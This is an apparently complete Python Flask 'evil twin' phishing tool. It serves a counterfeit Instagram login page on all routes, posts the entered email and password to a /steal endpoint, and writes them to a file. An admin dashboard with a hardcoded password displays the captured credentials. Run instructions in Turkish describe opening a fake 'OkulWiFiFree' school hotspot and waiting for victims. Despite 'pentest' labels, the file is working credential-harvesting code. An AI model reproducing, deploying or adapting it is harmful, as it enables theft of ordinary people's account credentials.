#!/usr/bin/env python3
import time, os, signal, sys
from flask import Flask, request, render_template_string, session, redirect, url_for, flash
from werkzeug.security import check_password_hash
import json
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'vortex_evil_twin_1453_secret_pentest'
creds_file = 'creds.txt'
PORT = 5555
creds_data = []
ADMIN_PASSWORD = 'Vortex1453'  # Pentest şifresi
LOGIN_HASH = 'your_hashed_password_here'  # Production'da hash kullan

def log_banner():
    os.system('clear')
    print("""
╔══════════════════════════════════════════════════════╗
║                🔥 ROOTLESS EVIL TWIN 🔥               ║
║                    LIVE PHISHING                     ║
║                   Port: 5555                         ║
╚═══════════════════════════════════════╦══════════════╝
                                        ║ ADMIN: /admin
                                        ║ Şifre: Vortex1453
                                        ╚═══════════════
    """)

def load_creds():
    global creds_data
    creds_data.clear()
    try:
        if os.path.exists(creds_file):
            with open(creds_file, 'r', encoding='utf-8') as f:
                for line in f.readlines():
                    if ':' in line:
                        timestamp, email_pass = line.strip().split(']', 1)
                        timestamp = timestamp[1:]  # remove [
                        email, password = email_pass.split(':', 1)
                        creds_data.append({
                            'time': timestamp,
                            'email': email,
                            'password': password,
                            'ip': 'N/A'
                        })
    except:
        pass

def log_creds(email, password, ip=''):
    print("\n" + "="*50)
    print("🎣 CRED YAKALANDI!")
    print(f"👤 {email}")
    print(f"🔑 {password}")
    print(f"🌐 {ip}")
    print("="*50 + "\n")

    with open(creds_file, 'a', encoding='utf-8') as f:
        f.write(f"[{time.strftime('%H:%M:%S')}] {email}:{password}\n")

PHISHING_HTML = '''<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width">
<title>Instagram</title>
<style>body{background:linear-gradient(135deg,#667eea,#764ba2);font-family:-apple-system,BlinkMacSystemFont,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:white;border-radius:20px;padding:40px;max-width:380px;width:100%;box-shadow:0 20px 40px rgba(0,0,0,.1)}
.logo{font-size:36px;font-weight:800;text-align:center;margin-bottom:30px;background:linear-gradient(45deg,#ff6b6b,#feca57);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
input{width:100%;padding:16px;margin:12px 0;border:2px solid #e1e5e9;border-radius:12px;font-size:16px;box-sizing:border-box}
.btn{background:linear-gradient(45deg,#0095f6,#00c6ff);color:white;border:none;padding:16px;border-radius:12px;font-size:18px;font-weight:600;width:100%;cursor:pointer}</style>
</head><body>
<div class="card">
<div class="logo">📱 Instagram</div>
<form id="form">
<input type="email" name="email" placeholder="📧 E-posta / Kullanıcı adı" required>
<input type="password" name="pass" placeholder="🔒 Şifre" required>
<button type="submit" class="btn">Giriş Yap</button>
</form>
</div>
<script>
document.getElementById('form').onsubmit=function(e){
  e.preventDefault();
  const fd=new FormData(this);
  fetch('/steal',{method:'POST',body:fd}).then(()=>location.href='/success');
}
</script>
</body></html>'''

# LOGIN PAGE TEMPLATE
LOGIN_TEMPLATE = '''<!DOCTYPE html>
<html>
<head>
    <title>🔥 Evil Twin Admin Login</title>
    <meta charset="utf-8">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:linear-gradient(135deg,#1e3c72,#2a5298);font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
        .login-card{background:white;border-radius:20px;padding:50px;max-width:400px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.3);}
        .logo{font-size:48px;font-weight:800;text-align:center;margin-bottom:30px;background:linear-gradient(45deg,#ff6b6b,#ee5a24);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
        .title{text-align:center;color:#333;margin-bottom:30px;font-size:1.5em;}
        input{width:100%;padding:18px;margin:15px 0;border:2px solid #e1e5e9;border-radius:12px;font-size:16px;box-sizing:border-box;transition:all 0.3s;}
        input:focus{border-color:#667eea;outline:none;box-shadow:0 0 0 3px rgba(102,126,234,0.1);}
        .btn{background:linear-gradient(45deg,#ff6b6b,#ee5a24);color:white;border:none;padding:18px;border-radius:12px;font-size:18px;font-weight:600;width:100%;cursor:pointer;transition:all 0.3s;}
        .btn:hover{transform:translateY(-2px);box-shadow:0 10px 25px rgba(255,107,107,0.4);}
        .hint{color:#666;text-align:center;margin-top:20px;font-size:0.9em;}
        .error{color:#ff4757;text-align:center;margin:15px 0;font-weight:500;}
    </style>
</head>
<body>
    <div class="login-card">
        <div class="logo">🔥 Evil Twin</div>
        <h2 class="title">Admin Panel Giriş</h2>
        {% with messages = get_flashed_messages() %}
            {% if messages %}
                <div class="error">{{ messages[0] }}</div>
            {% endif %}
        {% endwith %}
        <form method="POST" action="/admin/login">
            <input type="password" name="password" placeholder="🔑 Admin Şifresi" required autocomplete="off">
            <button type="submit" class="btn">Giriş Yap</button>
        </form>
        <div class="hint">Pentest için yetkilendirilmiş erişim</div>
    </div>
</body>
</html>'''

# ADMIN PANEL TEMPLATE (aynı kaldı, sadece session kontrolü eklendi)
ADMIN_TEMPLATE = '''<!DOCTYPE html>
<html>
<head>
    <title>🔥 Evil Twin Admin Panel</title>
    <meta charset="utf-8">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:linear-gradient(135deg,#1e3c72,#2a5298);font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;color:#333;min-height:100vh;padding:20px;}
        .container{max-width:1400px;margin:0 auto;background:white;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.3);overflow:hidden;}
        .header{background:linear-gradient(135deg,#ff6b6b,#ee5a24);color:white;padding:30px;text-align:center;position:relative;}
        .header h1{font-size:2.5em;margin-bottom:10px;}
        .logout-btn{position:absolute;top:20px;right:20px;background:rgba(255,255,255,0.2);color:white;border:1px solid rgba(255,255,255,0.3);padding:8px 16px;border-radius:20px;cursor:pointer;transition:all 0.3s;}
        .logout-btn:hover{background:rgba(255,255,255,0.3);}
        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;padding:30px;background:#f8f9fa;}
        .stat-card{background:white;border-radius:15px;padding:25px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.1);transition:transform 0.3s;}
        .stat-card:hover{transform:translateY(-5px);}
        .stat-number{font-size:2.5em;font-weight:800;color:#ff6b6b;}
        .stat-label{font-size:1.1em;color:#666;margin-top:5px;}
        .creds-section{padding:30px;background:#f8f9fa;}
        .table-responsive{max-height:500px;overflow:auto;}
        table{width:100%;border-collapse:collapse;background:white;border-radius:10px;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,0.1);}
        th{background:linear-gradient(135deg,#667eea,#764ba2);color:white;padding:20px 15px;font-weight:600;text-align:left;}
        td{padding:18px 15px;border-bottom:1px solid #eee;}
        tr:hover{background:#f8f9fa;}
        .email{max-width:300px;word-break:break-all;}
        .password{font-family:monospace;background:#f1f3f4;padding:8px 12px;border-radius:6px;display:inline-block;}
        .timestamp{color:#666;font-size:0.9em;}
        .clear-btn{background:#ff4757;color:white;border:none;padding:12px 24px;border-radius:25px;cursor:pointer;font-weight:600;font-size:1.1em;transition:all 0.3s;float:right;}
        .clear-btn:hover{background:#ff3742;}
        .refresh-btn{background:#2ed573;color:white;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:600;margin-bottom:20px;}
        .refresh-btn:hover{background:#26ad5f;}
        @media(max-width:768px){.stats{grid-template-columns:1fr;}.stat-number{font-size:2em;}}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔥 Evil Twin Admin Panel</h1>
            <p>Live Phishing Dashboard - Port: {{ port }}</p>
            <a href="/admin/logout" class="logout-btn">🚪 Çıkış</a>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number">{{ total_creds }}</div>
                <div class="stat-label">Toplam Credential</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{{ unique_emails }}</div>
                <div class="stat-label">Benzersiz Email</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{{ today_creds }}</div>
                <div class="stat-label">Bugün Yakalanan</div>
            </div>
        </div>
        
        <div class="creds-section">
            <button class="refresh-btn" onclick="location.reload()">🔄 Yenile</button>
            <button class="clear-btn" onclick="clearCreds()">🗑️ Tüm Verileri Sil</button>
            
            <div class="table-responsive">
                <table>
                    <thead>
                        <tr>
                            <th>⏰ Zaman</th>
                            <th>👤 Email</th>
                            <th>🔑 Şifre</th>
                            <th>🌐 IP</th>
                        </tr>
                    </thead>
                    <tbody>
                        {% for cred in creds %}
                        <tr>
                            <td class="timestamp">{{ cred.time }}</td>
                            <td class="email">{{ cred.email }}</td>
                            <td><span class="password">{{ cred.password }}</span></td>
                            <td>{{ cred.ip }}</td>
                        </tr>
                        {% endfor %}
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        function clearCreds() {
            if(confirm('Tüm credential verilerini silmek istediğinizden emin misiniz?')) {
                fetch('/admin/clear', {method: 'POST'})
                .then(() => location.reload());
            }
        }
    </script>
</body>
</html>'''

@app.route('/')
@app.route('/<path:path>')
def all_routes(path=''):
    return PHISHING_HTML

@app.route('/steal', methods=['POST'])
def steal():
    email = request.form.get('email', '')
    password = request.form.get('pass', '')
    ip = request.remote_addr
    log_creds(email, password, ip)
    return '<script>setTimeout(()=>location.href="/success",1000);</script>'

@app.route('/success')
def success():
    return '<html><body style="background:linear-gradient(45deg,#00b894,#00cec9);color:white;text-align:center;padding:150px;font-family:sans-serif"><h1>✅ WiFi Başarılı!</h1><p>İnternet aktif 🎉</p></body></html>'

# ADMIN ROUTES
@app.route('/admin', methods=['GET'])
def admin():
    if not session.get('authenticated'):
        return redirect(url_for('admin_login'))
    load_creds()
    
    total_creds = len(creds_data)
    unique_emails = len(set(cred['email'] for cred in creds_data if cred['email']))
    
    today = datetime.now().strftime('%H:%M:%S')[:8]
    today_creds = len([c for c in creds_data if c['time'].startswith(today)])
    
    return render_template_string(ADMIN_TEMPLATE, 
                                creds=creds_data[::-1],
                                total_creds=total_creds,
                                unique_emails=unique_emails,
                                today_creds=today_creds,
                                port=PORT)

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        password = request.form.get('password', '')
        if password == ADMIN_PASSWORD:
            session['authenticated'] = True
            return redirect(url_for('admin'))
        else:
            flash('❌ Yanlış şifre! Pentest şifresi gerekli.')
    
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/admin/logout')
def admin_logout():
    session.clear()
    return redirect(url_for('admin_login'))

@app.route('/admin/clear', methods=['POST'])
def clear_creds():
    if not session.get('authenticated'):
        return redirect(url_for('admin_login'))
    if os.path.exists(creds_file):
        os.remove(creds_file)
    load_creds()
    return '', 204

def handler(sig, frame):
    print("\n🛑 Durduruluyor...")
    sys.exit(0)

if __name__ == '__main__':
    signal.signal(signal.SIGINT, handler)
    log_banner()
    print("✅ EVIL TWIN HAZIR!")
    print("📱 1. Android Hotspot AÇ (OkulWiFiFree)")
    print("📱 2. Victim: instagram.com aç")
    print("🔐 3. ADMIN: http://192.168.43.1:5555/admin")
    print("🔑 4. ŞİFRE: Vortex1453")
    print("\n🔥 BAŞLIYOR... Ctrl+C durdur")
    app.run(host='0.0.0.0', port=PORT, debug=False)